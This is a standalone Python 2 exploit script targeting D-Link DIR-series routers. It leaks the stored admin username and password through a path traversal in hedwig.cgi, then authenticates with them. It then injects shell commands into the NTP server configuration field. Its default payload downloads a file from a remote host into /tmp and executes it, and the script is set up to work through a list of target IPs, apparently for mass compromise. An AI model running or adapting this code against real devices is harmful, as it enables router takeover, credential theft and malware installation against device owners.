#!/usr/bin/python
# coding=utf-8
import time,re,hmac,binascii,json,random,string,sys
import requests
from threading import Thread, current_thread
from Queue import Queue

domain_file = "ip.list"

headers={
        'User-Agent':'Mozilla/5.0 (Windows NT 4.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36',
        'Content-Type':'application/x-www-form-urlencoded'
    }
headersXml={
        'User-Agent':'Mozilla/5.0 (Windows NT 4.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36',
        'Content-Type':'text/xml'
    }

proxies = {'http': 'http://127.0.0.1:8080',
           'https': 'http://127.0.0.1:8080'}

def altAuthenticate(url,username,password,uid):
    try:
        data='REPORT_METHOD=xml&ACTION=login_plaintext&USER='+username+'&PASSWD='+password+'&CAPTCHA='
        altAuth=requests.post(url+'/session.cgi',headers=headers,timeout=15,data=data,cookies={'uid':uid})
        if '<RESULT>SUCCESS</RESULT>' in altAuth.text:
            return uid
        else:
            return False
    except:
        return False

def authenticate(url,username,password):

    try:
        authGet = requests.get(url+'/authentication.cgi',headers=headers,timeout=15)
        jsonAuth = json.loads(authGet.text)
        if('ok' not in jsonAuth['status']):
            return False
        uid=jsonAuth['uid']
        mac=getHMAC(username,password,jsonAuth['challenge'])
        authData='id='+username+'&password='+mac
        authPost=requests.post(url+'/authentication.cgi',headers=headers,cookies={'uid':uid},data=authData,timeout=15)

        if('ok' not in json.loads(authPost.text)['status']):
            return altAuthenticate(url,username,password,uid)
        else:
            return uid
    except:
            try:
                return altAuthenticate(url, username, password, uid)
            except:
                uid = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(10))
                return altAuthenticate(url, username, password, uid)

def getAccInfo(url):
    xmlData="""<?xml version="1.0" encoding="utf-8"?>
<postxml>
<module>
<service>../../../htdocs/webinc/getcfg/DEVICE.ACCOUNT.xml</service>
</module>
</postxml>"""

    try:
        getAcc=requests.post(url+'/hedwig.cgi',headers=headersXml,cookies={'uid':'zert'},data=xmlData,timeout=15)
        if getAcc.status_code != 200 :
            return False,getAcc.status_code,False
        username=re.search(r"<name>(.*)</name>",getAcc.text).group()[6:-7]
        password=re.search(r"<password>(.*)</password>",getAcc.text).group()[10:-11]
        try:
            model=re.search(r"DIR-[^\s]*",getAcc.headers['Server']).group()
        except:
            try:
                model=getAcc.headers['Server']
            except:
                model=getAcc.headers
        return username,password,model
    except:
        return False,False,False
    #print getAcc.text

def execute(url,uid,cmd):

    cookie={'uid':uid}
    postData='SERVICES=DEVICE.TIME'
    getCfg=requests.post(url+'/getcfg.php',headers=headers,cookies=cookie,data=postData,timeout=15)
    reSub=re.sub(r"<enable>(.+)</enable>", "<enable>1</enable>", getCfg.text)
    reSub=re.sub(r"<server>(.+)</server>", "<server>; ("+cmd+") & </server>",reSub)

    setConfig = requests.post(url + '/hedwig.cgi', headers=headersXml, cookies=cookie, data=reSub, timeout=15)
    if ('<result>OK</result>' not in setConfig.text):
        return False
    postData='ACTIONS=SETCFG,ACTIVATE'
    activateCfg=requests.post(url+'/pigwidgeon.cgi',headers=headers,data=postData,cookies=cookie,timeout=15)
    if ('<result>OK</result>' not in activateCfg.text):
        return False
    return True

def expl(addr,cmd):
    url="http://"+addr
    username, password, model = getAccInfo(url)
    if(username == False):
        if password == False:
            print 'Connection Error'
        else:
            print 'Failed to get account info'
        return False
    print model
    print username+':'+password
    uid=authenticate(url,username,password)
    if uid == False:
        print 'Failed to authenticate'
        return False
    code = execute(url,uid,cmd)
    return code

def getHMAC(username,password,challenge):
    mac=hmac.new(str(password))
    mac.update(username+challenge)
    return binascii.hexlify(mac.digest()).upper()


def exploit(addr):
    try:
        code = expl(addr,'wget -O /tmp/sh http://xx/sh;chmod +x /tmp/sh; /tmp/sh')
        return code
    except:
        return False

# MAIN
def main():
	if sys.argv[1]:
		exploit(sys.argv[1])
	else:
		print 'add parmeter'
if __name__ == '__main__':
    main()
